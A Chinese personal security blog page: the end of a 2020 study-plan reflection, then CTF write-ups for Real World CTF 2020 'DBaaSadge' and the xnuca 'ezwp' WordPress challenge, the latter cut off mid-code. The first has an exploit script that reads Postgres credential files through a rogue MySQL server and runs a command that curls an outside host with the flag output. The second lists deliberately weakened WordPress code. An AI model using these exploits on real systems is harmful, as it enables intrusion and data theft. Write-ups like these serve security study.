<li><input disabled="" type="checkbox"> buuoj50题(30/50)</li>
<li><input disabled="" type="checkbox"> 挖20个库币(5/20)不是我不努力，一堆重复。。</li>
<li><input disabled="" type="checkbox"> 我的世界写一个mod</li>
</ul>
<h3 id="5月份"><a href="#5月份" class="headerlink" title="5月份"></a>5月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 看完一本书（明朝那些事二）</li>
<li><input disabled="" type="checkbox"> ctf题目50题(14/50)</li>
<li><input checked="" disabled="" type="checkbox"> 补天30个库币(150/30)</li>
<li><input disabled="" type="checkbox"> 渗透靶场3个(0/3)</li>
<li><input disabled="" type="checkbox"> 每天学习8小时以上(20/30)</li>
</ul>
<h3 id="6月份"><a href="#6月份" class="headerlink" title="6月份"></a>6月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 至少阅读一本书</li>
<li><input disabled="" type="checkbox"> 发现有趣的东西</li>
<li><input checked="" disabled="" type="checkbox"> 尝试补天公测，快乐就好</li>
<li><input disabled="" type="checkbox"> 渗透靶场玩玩</li>
<li><input disabled="" type="checkbox"> xctf,rctf …历届题目复现</li>
</ul>
<h3 id="7月份"><a href="#7月份" class="headerlink" title="7月份"></a>7月份</h3><ul>
<li><input disabled="" type="checkbox"> 把<a target="_blank" rel="noopener" href="https://portswigger.net/web-security">burp</a> 里不太会的学完</li>
<li><input checked="" disabled="" type="checkbox"> 明朝那些事+ctf特训营web部分</li>
<li><input disabled="" type="checkbox"> 3个靶机，不要看wp，如果看了一定要把不会的内容系统学习，并重新做一遍</li>
<li><input disabled="" type="checkbox"> ctf 10 道好题</li>
<li><input checked="" disabled="" type="checkbox"> 编写新的url资产采集工具</li>
</ul>
<h3 id="10月份"><a href="#10月份" class="headerlink" title="10月份"></a>10月份</h3><ul>
<li><input checked="" disabled="" type="checkbox"> 内网渗透学习，完成htb3个靶场</li>
<li><input disabled="" type="checkbox"> 看完面向对象设计</li>
<li><input checked="" disabled="" type="checkbox"> 字节SRC尝试挖一个洞拿个衬衫</li>
</ul>
<h3 id="11月份"><a href="#11月份" class="headerlink" title="11月份"></a>11月份</h3><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><h3 id="寒假-1"><a href="#寒假-1" class="headerlink" title="寒假"></a>寒假</h3><p>前期做的挺好的,后面因为没有计划/不太会制定计划,就越来越浪</p>
<h3 id="3月份-1"><a href="#3月份-1" class="headerlink" title="3月份"></a>3月份</h3><p>3月份是真的彻底摸鱼过去,浑浑噩噩没有目标没有计划,但是有很多借口</p>
<p>最常用的是:我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>
<p>总结:选择一个目标,严格要求自己,记录下每天所做的事情</p>
<h3 id="4月份-1"><a href="#4月份-1" class="headerlink" title="4月份"></a>4月份</h3><p>总的来说还是偶尔摸鱼偶尔努力，没有目标，该为未来的工作努力下了。4月和学长一起开发了一个自动漏扫工具感觉还不错。5月份自律下吧，毕竟以前我还是挺自律的。4月份的目标没有全部完成，完成一半大概还是有的。果然反思还是要有点切入点的，不然不知道在写啥。</p>
<h3 id="5月份-1"><a href="#5月份-1" class="headerlink" title="5月份"></a>5月份</h3><p>4月份写的脚本真的很给力，一下挖了很多洞，就是太费时了。。基本上半个月每天4个小时都在挖洞。。。其实整个在家的期间都没有动力，始终都是做着一些重复的劳动，倒没有去学习。希望自己能够因为兴趣而研究，学习。就这样</p>
<h3 id="6月份-1"><a href="#6月份-1" class="headerlink" title="6月份"></a>6月份</h3><p>没有强制任务就开始水了，看来还是得定量一些任务的。其实我一直摸鱼的原因有一部分是因为长时间摸鱼，然后对于进行那些劳累自己心智的任务会有抗拒，有时候逼一下自己就好了。7月份要记录每天所作的事情</p>
<h3 id="年度总结"><a href="#年度总结" class="headerlink" title="年度总结"></a>年度总结</h3><p>2020年过去了，这份计划也是做一会停一会，奖惩制度也没有认真执行，虽然有着不错的开头，但是在过程中夭折，或许我应该在能看到的地方时刻提醒自己？</p>
<h2 id="杂"><a href="#杂" class="headerlink" title="杂"></a>杂</h2><p>最近又被没有理想和目标所困扰,到底是我没有还是我不想有,反正最近是挺无聊的.多看点书,多思考一下吧</p>
<p>我要找到我热爱的目标,哪有什么东西能让你在整个过程一直热爱,过程必然辛苦,这也是最后实现时快乐的燃料,不过换一种思考角度就有可能不觉得辛苦了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/03/01/%E6%88%91%E7%9A%842020/" data-id="ckw7zwc1o007xfmol24p6hav9" data-title="我的2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">记录</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-real world ctf 2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/01/13/real%20world%20ctf%202020/" class="article-date">
  <time class="dt-published" datetime="2021-01-13T16:00:00.000Z" itemprop="datePublished">2021-01-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/01/13/real%20world%20ctf%202020/">real world ctf 2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p>
<h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$sql</span>=(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&quot;sql&quot;</span>])&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$sql</span>)&gt;<span class="number">100</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;That query is too long ;_;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!pg_pconnect(<span class="string">&#x27;dbname=postgres user=realuser&#x27;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;DB gone ;_;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span> = pg_query(<span class="variable">$sql</span>))&#123;</span><br><span class="line">  print_r(pg_fetch_all(<span class="variable">$query</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;._.?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目提供了docker文件</p>
<p>看下Dockerfile发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装了postgresql-10-mysql-fdw</span><br><span class="line">还开启了dblink</span><br></pre></td></tr></table></figure>

<p>相关的介绍文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/10/contrib-dblink-function.html">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p>
<p>一个是远程连接mysql，一个是远程连接postgresql 。</p>
<p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#x27;ccreater.top&#x27;,port&#x27;63306&#x27;)</span><br><span class="line">CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#x27;a&#x27;, password &#x27;a&#x27;);</span><br><span class="line">CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#x27;a&#x27;,table_name &#x27;a&#x27;)</span><br><span class="line">select * from c</span><br></pre></td></tr></table></figure>

<p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p>
<p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p>
<p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p>
<p><code>/var/lib/postgresql/10/main/global/1260</code></p>
<p>查找一下postgresql的加密规则：md5(password+username)</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sqls=[</span><br><span class="line">      <span class="string">&quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#x27;ccreater.top&#x27;,port&#x27;63306&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#x27;a&#x27;, password &#x27;a&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#x27;a&#x27;,table_name &#x27;a&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;select * from c&quot;</span></span><br><span class="line">]</span><br><span class="line">sqls=[</span><br><span class="line">      <span class="string">&quot;select dblink(&#x27;host=0 password=jpr5q&#x27;,&#x27;copy(select)to program&#x27;&#x27;curl y5pwcd.ceye.io/`/readflag`&#x27;&#x27;&#x27;)&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">sql</span>):</span></span><br><span class="line">      burp0_url = <span class="string">&quot;http://54.219.197.26:60080/&quot;</span></span><br><span class="line">      burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">      r= requests.get(burp0_url, headers=burp0_headers,params=&#123;</span><br><span class="line">            <span class="string">&quot;sql&quot;</span>:sql</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sql <span class="keyword">in</span> sqls:</span><br><span class="line">      hack(sql)</span><br></pre></td></tr></table></figure>

<p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2021/01/13/real%20world%20ctf%202020/" data-id="ckw7zwc150064fmol11k90602" data-title="real world ctf 2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020xnuca_ezwp题解" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/" class="article-date">
  <time class="dt-published" datetime="2020-12-15T16:00:00.000Z" itemprop="datePublished">2020-12-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020-xnuca-ezwp题解"><a href="#2020-xnuca-ezwp题解" class="headerlink" title="2020 xnuca ezwp题解"></a>2020 xnuca ezwp题解</h1><p>wpscan扫一波发现wp是最新版本</p>
<p>本地搭好环境后，登入后台发现，有个插件是n年前的版本，很明显漏洞点在这</p>
<p>漏洞分析：<a target="_blank" rel="noopener" href="https://paper.seebug.org/774/">https://paper.seebug.org/774/</a></p>
<p>对wp和插件对比以下官方下载的，存在以下差异</p>
<h2 id="文件对比"><a href="#文件对比" class="headerlink" title="文件对比"></a>文件对比</h2><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>/wp-admin/includes/class-wp-screen.php 294行</p>
<hr>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">						wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">					&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">					&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">						$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">					&#125; else &#123;</span><br><span class="line">						$post_id = 0;</span><br><span class="line">					&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>/wp-admin/includes/file.php 762行加了一个文件名不能包含php的waf（只检测了小写）</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">空</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ( (stristr(file_get_contents($file[&#x27;tmp_name&#x27;]), &quot;php&quot;) !== FALSE) ) &#123;</span><br><span class="line">        return call_user_func_array( $upload_error_handler, array( &amp;$file, __( &#x27;Sorry, this file content is not permitted for security reasons.&#x27; ) ) );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>/wp-admin/includes/post.php 221</p>
<p>array_diff_key 参数少了’file’</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;file&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return array_diff_key( $post_data, array_flip( array( &#x27;meta_input&#x27;, &#x27;guid&#x27; ) ) );</span><br></pre></td></tr></table></figure>

<hr>
<p>wp-admin/post.php 19行，少了很多条件</p>
<p>官方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) &amp;&amp; isset( $_POST[&#x27;post_ID&#x27;] ) &amp;&amp; (int) $_GET[&#x27;post&#x27;] !== (int) $_POST[&#x27;post_ID&#x27;] ) &#123;</span><br><span class="line">	wp_die( __( &#x27;A post ID mismatch has been detected.&#x27; ), __( &#x27;Sorry, you are not allowed to edit this item.&#x27; ), 400 );</span><br><span class="line">&#125; elseif ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if ( isset( $_GET[&#x27;post&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_GET[&#x27;post&#x27;];</span><br><span class="line">&#125; elseif ( isset( $_POST[&#x27;post_ID&#x27;] ) ) &#123;</span><br><span class="line">	$post_id = (int) $_POST[&#x27;post_ID&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$post_id = 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>wp-includes\Requests\Utility\FilteredIterator.php<br>删除了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function unserialize( $serialized ) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/**</span><br><span class="line">	 * @inheritdoc</span><br><span class="line">	 */</span><br><span class="line">	public function __unserialize( $serialized ) &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__unserializeFound</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function __wakeup() &#123; // phpcs:ignore PHPCompatibility.FunctionNameRestrictions.ReservedFunctionNames.MethodDoubleUnderscore,PHPCompatibility.FunctionNameRestrictions.NewMagicMethods.__wakeupFound</span><br><span class="line">		unset( $this-&gt;callback );</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h3 id="contact-form-7"><a href="#contact-form-7" class="headerlink" title="contact form 7"></a>contact form 7</h3><p>原来：<br>134行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">    return wp_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;send_mail( $recipient, $subject, $body, $headers, $attachments );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public function send_mail($to, $subject, $message, $headers = &#x27;&#x27;, $attachments = array()) &#123;</span><br><span class="line">	    try &#123;</span><br><span class="line">            $host = explode(&quot;@&quot;, $to)[1];</span><br><span class="line">            $url = &quot;http://$host&quot;;</span><br><span class="line">            $post_data = array(</span><br><span class="line">                &quot;subject&quot; =&gt; $subject,</span><br><span class="line">                &quot;message&quot; =&gt; $message,</span><br><span class="line">                &quot;headers&quot; =&gt; $headers</span><br><span class="line">            );</span><br><span class="line">            if ($attachments !== array()) &#123;</span><br><span class="line">                if (!empty($attachments[0])) &#123;</span><br><span class="line">                    $post_data[&quot;file&quot;] = curl_file_create($attachments[0]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch , CURLOPT_URL , $url);</span><br><span class="line">            curl_setopt($ch , CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POST, 1);</span><br><span class="line">			curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP);</span><br><span class="line">            curl_setopt($ch , CURLOPT_POSTFIELDS, $post_data);</span><br><span class="line">			$data = curl_exec($ch);</span><br><span class="line">			curl_close($ch);</span><br><span class="line">			if ($data) &#123;</span><br><span class="line">				file_put_contents(&quot;/tmp/1.log&quot;, $data);</span><br><span class="line">			&#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (Exception $e) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>





<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>跟以下之前的漏洞发现，漏洞点调用了wp_mail，而题目改成了send_mail，里面的存在文件系统相关的函数，加上题目删除反序列化的方法，大概率思路就是利用之前的漏洞+反序列化getshell</p>
<h2 id="绕过最新版本wp限制来利用历史漏洞"><a href="#绕过最新版本wp限制来利用历史漏洞" class="headerlink" title="绕过最新版本wp限制来利用历史漏洞"></a>绕过最新版本wp限制来利用历史漏洞</h2><p>利用原来的payload直接打过去发现不太行，跟踪发现：</p>
<p>/wp-admin/includes/post.php 221：</p>
<p><code>return array_diff_key( $post_data, array_flip( array( &#39;meta_input&#39;, &#39;guid&#39; ) ) ); </code></p>
<p>最新版wp对post数据进行了过滤，删除了meta_input和guid的键，导致我们无法写入postmeta,继续跟踪发现有个地方可以用别的键写入postmeta:</p>
<p>/wp-admin/includes/post.php 872：</p>
<p><code>add_meta( $post_ID );</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_meta</span>(<span class="params"> <span class="variable">$post_ID</span> </span>) </span>&#123;</span><br><span class="line">	<span class="variable">$post_ID</span> = (<span class="keyword">int</span>) <span class="variable">$post_ID</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$metakeyselect</span> = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyselect&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metakeyinput</span>  = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ? wp_unslash( trim( <span class="variable">$_POST</span>[<span class="string">&#x27;metakeyinput&#x27;</span>] ) ) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$metavalue</span>     = <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] ) ? <span class="variable">$_POST</span>[<span class="string">&#x27;metavalue&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="keyword">if</span> ( is_string( <span class="variable">$metavalue</span> ) ) &#123;</span><br><span class="line">		<span class="variable">$metavalue</span> = trim( <span class="variable">$metavalue</span> );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ( ( ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &amp;&amp; ! <span class="keyword">empty</span>( <span class="variable">$metakeyselect</span> ) ) || ! <span class="keyword">empty</span>( <span class="variable">$metakeyinput</span> ) ) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * We have a key/value pair. If both the select and the input</span></span><br><span class="line"><span class="comment">		 * for the key have data, the input takes precedence.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ( <span class="string">&#x27;#NONE#&#x27;</span> !== <span class="variable">$metakeyselect</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyselect</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( <span class="variable">$metakeyinput</span> ) &#123;</span><br><span class="line">			<span class="variable">$metakey</span> = <span class="variable">$metakeyinput</span>; <span class="comment">// Default.</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ( is_protected_meta( <span class="variable">$metakey</span>, <span class="string">&#x27;post&#x27;</span> ) || ! current_user_can( <span 